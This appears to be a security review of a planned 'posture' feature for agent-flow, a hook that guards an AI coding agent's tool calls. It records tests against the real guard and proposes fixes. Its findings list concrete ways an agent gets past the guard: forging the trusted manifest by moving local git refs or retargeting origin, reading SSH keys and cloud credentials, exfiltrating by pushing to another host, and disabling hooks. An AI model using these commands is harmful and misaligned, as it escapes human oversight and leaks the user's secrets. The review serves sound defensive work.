# P2: posture mechanism tamper + team/production review

Scope: plan/POSTURE-DESIGN.md (v4 candidate), PHASE5-PLAN.md v3 (read from git 940a9f8; neither it nor plan/reviews/ is in the working tree, the review copies are in the session scratchpad). Code at HEAD d9f7146, built extensions/lib/*.js on Windows, git 2.51, node 24.
Method: real temp git repos with a bare origin, an "agent" runner that asks the REAL hook (`node bin/agent-flow.js guard`, PreToolUse JSON on stdin, role-less unless stated) and runs the command only if allowed. Scripts: scratchpad/p2lib.mjs, p2a/c/d/e/f/g/h/i/t.mjs, p2t.out.
IMPORTANT: posture is not implemented. Where I say "guard sees posture=X" I called the real `loadManifestForGuard` / `trustedManifest` with a `posture` key in the manifest, which is exactly what a naive implementation would read. For enforcement outcomes I used the existing analogues (`deny_read`, `protected_paths`, `gates`).

## Ranked findings

### F1 CRITICAL: "default-branch copy" is the LOCAL `main` ref, and the agent can move it with T0 actions
`defaultBranch()` (git.ts:52-61) = `origin/HEAD` symref, else local `main`/`master`, and `defaultBranchManifest` does `git show <that name>:CONTEXT_MANIFEST.json` (manifest.ts:412-419): the local branch tip, not `origin/main`. Replays (guard ALLOWed every step, then the loader read the weak copy):
- `git checkout -b feat` + Write weaker manifest + commit; `git checkout main && git merge feat` (local self-merge, nothing pushed): guard now sees `posture=solo deny_read=[]`; `cat secrets/db.txt` ALLOW. `git push origin main` is still blocked today, but under `solo` the design would now allow it.
- `git branch -f main feat`, `git commit --amend` on main, `git branch -m main old && git branch -m feat main`, `git remote set-head origin feat` (after pushing feat): all ALLOW, all swap the "default-branch" copy.
- `git remote set-url origin <attacker repo>` + `git fetch` is ALLOW; `origin/main:CONTEXT_MANIFEST.json` then shows the attacker's `posture: solo`. So even switching the source to `origin/main` is agent-forgeable (set-url, `symbolic-ref refs/remotes/origin/HEAD`, `remote set-head` are not guarded; only `update-ref` and `fetch <src>:<dst>` are).
- `reset --hard HEAD~1` on main is only blocked when `protected_paths` is non-empty (bulk-git-protected); with it empty it is allowed.
- The existing floor has the same hole: `git branch -f main feat` changed `trustedManifest().gates` from `npm test` to the attacker's command (p2g.mjs). `gates` are commands the orchestrator runs outside the guard.
Design claim "relaxations only from the default-branch copy" is therefore false: the copy is agent-writable via T0.
FIX (write into POSTURE-DESIGN.md, Mechanism):
> Trust anchor. No repo-local ref is a trust anchor: branch tips, `origin/HEAD`, remote URLs and remote-tracking refs are all writable by T0 git commands. Therefore a repo can only TIGHTEN posture. A relaxation (`solo`) is user-level state, never repo state: set by the human at launch (`AGENT_FLOW_POSTURE=solo`, or `~/.agent-flow/config.json`, written by a human-run `agent-flow posture set solo` that refuses a non-TTY or an AGENT_FLOW_ROLE/agent session), and honoured only if the repo's committed `min_posture` (strictest of disk/HEAD/default/origin copies) allows it. The repo manifest carries `min_posture: team|strict` (a ratchet); `posture` is not a repo key. Default with no user setting: `team`.
This also fixes F3/F6 (inheritance by teammates and CI).

### F2 HIGH: FLOORED_KEYS is the wrong mechanism; the guard never uses it
- `loadManifestForGuard` (manifest.ts:320-352) does not consult FLOORED_KEYS; it returns the DISK manifest plus additive floors for protected_paths/deny_read/deny_commands only. Replay: disk `posture: solo` over committed `team`, "guard sees posture=solo" (p2c 1c-i). Adding `posture` to FLOORED_KEYS (as plan B1 says) fixes only `trustedManifest` (gates/classify/brief/state machine), not the hook.
- FLOORED semantics are "replace by `base ?? head`" (manifest.ts:378,383-389): (a) disk `team` cannot tighten over default `solo`; (b) when default lacks the manifest, HEAD relaxations are honoured. Replay p2i (e): main has no manifest, feature HEAD has `pipeline.max_cost_usd: 9999` -> `trustedManifest().pipeline` returns it. That contradicts "relaxations only from the default branch" and "strictest-of".
- Because `trustedManifest` copies unknown keys from disk, `posture` passes through from disk even there (trusted.posture=solo in 1c-i).
FIX: do not add `posture`/`min_posture` to FLOORED_KEYS. New function `effectivePosture(root, env, userCfg)` with a total order `solo < team < strict` and this table: effective = max(strictness of {repo min_posture from disk, HEAD, default, origin copies; AGENT_FLOW_MIN_POSTURE; machine policy file}, default `team`); then `solo` only if the user-level setting is `solo` AND that max <= solo. A missing key in HEAD/disk means "no opinion", NOT team (else every branch cut before the key existed is team). Unknown/garbled value = team. Only `team`/`strict` can ever be read from disk.
Consistency matrix (verified by reasoning against the code; not implemented): default=solo/HEAD=team -> team; default=team/HEAD=solo -> team; default missing/HEAD=solo -> team; disk=strict anywhere -> strict (agent can only self-harden: harmless, but a self-DoS/griefing vector, note it).

### F3 HIGH: no committed manifest -> disk counts -> agent self-sets posture
Replay p2i (a): no manifest anywhere; Write `{"posture":"solo"}` ALLOW; guard and trustedManifest both report solo. Same for `deny_read` (p2a: block -> allow after the agent rewrites the disk copy). The loader comment says it is by design (manifest.ts:326, 379). Under the design's `solo` this lets a fresh clone or an agent that deleted the committed manifest (that case is covered: "absence is not permission", manifest.ts:349) ... but not the never-committed case.
FIX: "Posture is never read from an uncommitted file. `init --yes` and any non-TTY run write `min_posture: team` or nothing; only a human-run interactive `agent-flow posture set` can select solo." (The bootstrap skill and agents run `init`; bin:2563-2625 has a `--yes` path.)

### F5 HIGH: the guard does not cover most T2 outcomes; "T2 blocked in every posture" is a claim with no rules behind it
Replay p2t.out, role-less, manifest with no protected_paths. BLOCKED: `git push origin main`/delete/force variants, `--mirror`, `push_files` to main, `.env*` reads (cat, `git show HEAD~5:.env`). Everything below was ALLOW:
- External publish/post: `curl -X POST ... @file`, `curl -T`, `gh gist create --public`, `gh issue/pr comment`, `gh release create`, MCP Slack post, MCP Gmail send, MCP github create_release, MCP linear/notion create.
- Deploy via T0/T1 shapes: `git tag v9 && git push origin v9`, `push --tags`, `git push origin HEAD:production`, `HEAD:release/1.0` (only main/master and the disk `default_branch` key are "protected", guard.ts:1687), `gh workflow run`, `gh api -X POST .../dispatches`, `npm publish`, `docker push`, `terraform apply -auto-approve`, `kubectl delete ns prod`, `vercel --prod`.
- Destructive remote writes: `gh repo delete`, `gh api -X DELETE repos/o/r[/git/refs/heads/main|release/1.0]`, `gh repo edit --visibility public`, `gh api -X PUT .../branches/main/protection -F enforce_admins=false`, `gh pr merge --admin`, plain `gh pr merge`, MCP merge_pull_request (role-less), MCP delete_branch, `push_files` to `production`, MCP postgres `DROP TABLE`, MCP stripe refund.
- Exfil: `git push https://<other-host>/x.git HEAD:dump` (reached the network), `git remote add o2 ... && push`, `scp`, `git bundle` + curl, `WebFetch ?d=<data>`. Retargeting origin is also allowed (F1).
- Secret reads outside `.env*` (ENV_FILE regex, risk.ts:206): `cat ~/.aws/credentials`, `~/.ssh/id_ed25519`, `~/.config/gh/hosts.yml`, `gh auth token`, `gh auth status -t`, `git credential fill`, `.npmrc`, `.netrc`, `printenv`, `env | grep -i key`, `cat .git/config` and `git remote -v` (token-bearing URLs), `*.pem`/`*.key`, `credentials.json`, Read tool on `~/.ssh/id_rsa`, python/node reading `.env`. - Spend: role-less `Task`/`Agent` tool, `claude -p` loop, `codex exec`, `aws ec2 run-instances`, paid-API curl (roles are blocked from launching agents, role-less is not: guard.ts:1677, 1953).
- Disable the guard: Write `.claude/settings.json` (`disableAllHooks`), Write/sed `~/.claude/settings.json`, `npm uninstall`, `agent-flow uninstall --yes`, `rm node_modules/@drix10/agent-flow`, `claude --settings '{"disableAllHooks":true}'`, `.bashrc` env export, `rm -rf .agent-flow`, `touch .agent-flow/audit.lock`. With protected deploy/ + workflows in the manifest, role-less workflow/deploy/settings writes are BLOCKED (M1), so the "hot paths stay strict" claim holds only when the repo opted in via protected_paths.
- Local irreversible T0: `git clean -fdx`, `git checkout -- .`, `git branch -D`, `rm -r src`, `rebase --root` all ALLOW. Answer to the design's open question: yes, these are T0-by-default today and irreversible (uncommitted/untracked work); `reset --hard` is only gated by protected_paths.
- Nested repo: `git init nested && cd nested`; then the guard root is `nested`, no manifest, and `cat ../secrets/db.txt`, `cat ../.env`, Write `../src.txt` (protected) were ALLOW (p2h). Depends on the harness passing the persisted cwd (true for Claude Code Bash cwd, NOT verified live here). A nested repo with its own uncommitted manifest also gets "disk counts" (F3).
FIX (Tier table): replace "T2 always gated" with an honest column: `enforced today` / `rule to write` / `not enforceable (needs sandbox or server)`. Move into the Release-B scope only the rules that exist: push/merge default+release branches, `remote-write` (B2). Mark external publish, spend, deploy, exfil, non-.env secrets as "not covered; use `agent-flow sandbox --no-net --hide-home` (Linux/WSL only), managed harness permissions, or server-side controls". Add a "protected branches" list (release/*, production, prod, staging, tags) read from the committed floor, not the single disk `default_branch` key. Resolve the T0/T2 contradiction: "read-only actions are NEVER blocked" vs "T2 read secrets" (say "reads of secret files are T2").

### F6 HIGH (team): solo is inherited by teammates and CI, and nothing reviews a relaxation
One dev commits `posture: solo`; once on main every clone, every teammate's agent and CI runs solo (T1 push/merge allowed). Existing review plumbing is weaker than it looks: `doctor`'s CODEOWNERS note covers CONTEXT_MANIFEST.json only when `protected_paths` is non-empty (`ownedPaths`, bin:332-337), `agent-flow codeowners` errors with "no protected_paths" (bin:372), and nothing in `check-staged`/CI compares the posture of base vs head. The `hostCodeOwnerReview` helper (codeowners.ts:123) reports only Code-Owner review state, and only for the branch it is told.
FIX: (1) user-level relaxation (F1) removes inheritance by construction. (2) `ownedPaths` always includes CONTEXT_MANIFEST.json (and `.agent-flow/`-adjacent policy files) so CODEOWNERS covers it from day one. (3) `agent-flow check-posture --base origin/main` for CI: exit 1 when HEAD's `min_posture` is weaker than base's, unless the PR carries a recorded approval; wire as a required status check (org ruleset). (4) Audit of posture changes = `git log -S'min_posture' -- CONTEXT_MANIFEST.json`; `status` prints "min_posture team, last changed by <author> <sha> <date>".

### F7 HIGH (platform owner): there is no floor a repo cannot lower, and the design does not create one
Code search: no machine/user/org config exists (only `AGENT_FLOW_HOME` for the update cache, update.ts:109). `AGENT_FLOW_GUARD_STRICT=1` only affects fail-closed. The design's "managed-config recommended" under `strict` is a docs sentence, not a mechanism.
FIX: add `AGENT_FLOW_MIN_POSTURE` (launcher/managed env) and a machine policy file (`%ProgramData%\agent-flow\policy.json`, `/etc/agent-flow/policy.json`; honoured only when not writable by the current user, else ignored with a doctor warning) into the strictest-of table. State that the enforceable org floor is: harness managed settings that set the env and `allowManagedHooksOnly` (Claude), Codex `requirements.toml`, etc. (V-reports), plus org-level GitHub rulesets (required review from code owners, no bypass, required `check-posture` workflow). `strict` must be conditional, not aspirational: `status` shows `strict (enforced)` only when all of: managed wiring detected or declared, CODEOWNERS covers manifest+hot paths, server rule requires review with no admin bypass (readable only with admin: else "unknown"), audit head anchored off-box, harness tier ENFORCED (Claude/Pi only today); otherwise print `strict (declared, not enforced on <harness>)`. What strict needs that team does not: unconditional wiring/manifest/CODEOWNERS protection for all roles, no `ask`, no pause without audit anchor, `reset --hard`/`clean`/`branch -D` gated, release/tag/dispatch/remote-write rules (F5), fail-closed wrapper (A9), off-box audit.

### F8 MEDIUM: posture detection (init/doctor)
Signals and failure directions:
- Safe direction is team. Never output `solo` from detection; show evidence and a default of `team`; solo only on explicit human choice (non-TTY and `--yes` never choose it; an agent runs `init`).
- Unprotected `main` is a weak signal: GitHub free private repos cannot have protection/rulesets; `protected:false` also appears when a ruleset applies (UNVERIFIED whether `branches/<b>.protected` reflects rulesets; the code reads `rules/branches/<b>` first for that reason, codeowners.ts:142). A team repo with unprotected main would be recommended solo.
- Protection that exists may not bind the agent: the agent uses the dev's token (here admin=true, `protection.enabled:false`); classic protection with `enforce_admins:false` and rulesets with a bypass list let an admin token push or `gh pr merge --admin`. `enforce_admins`/bypass actors are readable only with admin. So even "team + remote protection ON" is not safe for an admin's agent; `status` must say so.
- Contributors: `git shortlog -sne` on shallow/CI clones undercounts; squash merges and bots inflate/deflate; agent-spoofable via `git config user.email` rewrites and `commit --author` (T0). Use only as a tightening signal ("more than one author -> team").
- CODEOWNERS/CI/deploy-config presence: the agent can delete them (T0) before a human runs init; only tightening direction is safe. Forks: origin may be the user's fork of a team repo (`gh api repos/o/r` `.parent`, `.fork`); detect fork -> team. Monorepos: manifest at repo root only; `deploy/` anywhere. Org-owned repo (`owner.type == Organization`, `ownerKind` exists, codeowners.ts:84) -> team.
- Network: `gh api` is acceptable in init/doctor only with the existing contract (`hostCodeOwnerReview`: 4 s timeout, null on no gh/not logged in/offline, skipped when `--offline`, `AGENT_FLOW_OFFLINE=1` or `CI`, bin:355) and result is advisory text only. Never in the guard hook (latency, fail-open on timeout per V1, attacker-controlled `AGENT_FLOW_GH`/PATH/remote URL; B3's probe is the one exception and must keep its 3 s cap and try/catch). `doctor` re-suggestion must only ever suggest tightening automatically; "you could relax" is a manual `posture set` prompt.
- Provenance: record the signals snapshot in the init output, not as a trusted input.

### F9 MEDIUM: audit in solo
Replay p2f: after a `git status`, a `curl POST`, two pushes to main and a `.env` cat, `.agent-flow/audit.jsonl` contained ONLY the 3 blocked calls (cmdGuard returns 0 without logging an allow, bin:1304). Under solo "allow + log" there is no logging code today.
- Secrets already leak into the log: `target` kept `https://alice:hunter2pass@github.com/...` and `curl -u admin:s3cretpw ...` verbatim (redaction at guard.ts:1202 misses URL userinfo and `-u`); the `sk-...` token was redacted. `reason` is also unredacted (plan H10).
- Tamper: `rm -rf .agent-flow` and `touch .agent-flow/audit.lock` are ALLOW role-less (p2t); the chain is tamper-evident only against partial edits (SECURITY.md:32 says so honestly).
- Review: `audit` has only `verify | head | summary` (bin:641-676); summary has no time window and no event list. "What did my agent do at 3am" is unanswerable except by reading raw JSONL.
- PreToolUse sees intent, not outcome: a logged allow does not prove the push happened.
FIX: for every allowed T1 action under solo, one line `{at, event:"t1_allow", variant, harness, session, role, tool, remote:<name>, dest:<ref>, head_sha, repo_url_without_userinfo}` and no command text; same redaction for blocks; store in a journal outside the agent-writable repo dir (`~/.agent-flow/journal/<repo-id>.jsonl`, hash-chained, `.agent-flow` protected) and make `agent-flow audit log --since 8h [--rule t1_allow]` (new) the answer to the 3am question. Offer PostToolUse capture of exit status where the harness has it. Point to the authoritative record: `git reflog`, remote push events/audit log.

### F10 LOW/process: the tier table promises more than the guard can
- "Hot paths stay strict under solo" is only true if protected_paths lists them (F5). Make a built-in, unconditional hot-path list (`.env*`, `.github/workflows/`, wiring files, CODEOWNERS, the manifest) independent of the manifest.
- `kill switch env restores pre-posture behaviour` (Mechanism) must be launcher-only and logged; today the settings `env` block can set it (F4).
- Orchestrator already self-merges low-risk PRs when `pipeline.auto_merge_low_risk` (orchestrate.ts:825, floored `pipeline`, but floor = local main, F1). Under `team` this must stay compatible; document it.
- Three postures: fine as the vocabulary, but `solo` must be a user-level label and `team/strict` the repo-level floor (F1).

## What to say honestly per posture (copy into docs)
- solo: "Your agent may push and merge to the default branch and the guard records it. Nothing here limits publishing, deploying, spending or reading credentials outside .env files. Use only where you alone can be hurt."
- team: "Blocks push/merge of the default branch and release branches by this guard. It does not stop a person, another tool, or an admin token; server-side branch protection with no admin bypass is the real boundary. Not covered: publishing, spend, secret files other than .env, remote deletes via API until B2."
- strict: "Declared, and only 'enforced' where status says so. Needs managed harness config and server rules; a project-level guard is advisory against a determined agent or user."
Avoid: "agents never push to main" (true only for the push command on harnesses with a live hook), "managed config recommended" as a safeguard, "posture is read only from the default branch" (the local default branch is agent-writable), "audit trail" for solo (allows are not logged today), "model-neutral" (no frontier-model evidence), "T2 blocked in every posture".
